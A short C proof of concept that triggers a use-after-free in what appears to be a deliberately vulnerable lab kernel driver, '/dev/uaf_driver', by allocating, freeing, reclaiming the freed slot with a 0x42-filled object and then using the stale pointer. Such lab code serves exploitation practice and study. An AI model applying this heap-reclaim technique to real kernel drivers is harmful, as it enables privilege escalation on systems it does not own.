#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <stdlib.h>

typedef struct k_object {
	char buf[96];
} k_object_t;

enum IoctlSwitch {
    ALLOC_UAF_OBJECT = 0,
    USE_UAF_OBJECT = 1,
    FREE_UAF_OBJECT = 2,
    ALLOC_K_OBJECT = 3
};

int main() {
	int dev = open("/dev/uaf_driver", O_RDWR);

 	k_object_t* object = malloc(sizeof(k_object_t));

    memset(object->buf, 0x42, 60);
    
    ioctl(dev, ALLOC_UAF_OBJECT, NULL);
    ioctl(dev, FREE_UAF_OBJECT, NULL);
    ioctl(dev, ALLOC_K_OBJECT, object);
    ioctl(dev, USE_UAF_OBJECT, NULL);
}
